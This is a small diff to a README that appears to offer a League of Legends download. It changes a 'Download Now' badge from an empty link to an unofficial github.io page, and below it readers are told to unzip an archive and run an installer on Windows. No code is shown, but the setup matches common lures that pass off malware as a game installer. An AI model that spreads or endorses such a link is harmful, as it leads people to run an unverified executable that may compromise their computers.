@@ -8,7 +8,7 @@ Players form teams of five and compete to **destroy the enemy Nexus**, coordinat
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-teal?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-teal?style=for-the-badge)](https://league-of-legends-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
